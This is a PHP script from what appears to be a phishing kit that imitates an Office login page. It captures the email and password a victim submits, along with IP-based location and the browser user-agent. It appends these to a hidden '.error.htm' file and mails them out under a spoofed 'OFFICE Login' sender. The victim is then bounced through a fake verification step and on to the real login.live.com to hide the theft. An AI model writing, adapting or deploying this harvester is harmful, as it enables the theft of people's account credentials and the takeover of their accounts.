<?php
require_once('mail.php');
require_once('geoplugin.class.php');
require_once('sync.php');
require_once('api.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$browser = $_SERVER['HTTP_USER_AGENT'];

$message = "=============+ EMAIL OFFICE Login +=============\n";
$message .= "Email: ".$_GET['email']."\n";
$message .= "Password: ".$_GET['password']."\n";
$message .= "============= [ Location Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";


    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp); 


	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);

$domain = 'OFFICE Login';
$subj = "New OFFICE Login | ".$_GET['email'];
$from = "From: $domain<sterben@exi2t.com>\n";
mail($to,$subj,$message,$from,$domain);
if ($_GET['verify'] == 0) {
	echo "<script>window.location='verify.php?email=".$_GET['email']."&error=true&verify=1'</script>";
}
if ($_GET['verify'] == 1) {
	session_start();
	echo "<meta http-equiv='refresh' content='0; url=https://login.live.com/'/>";
}
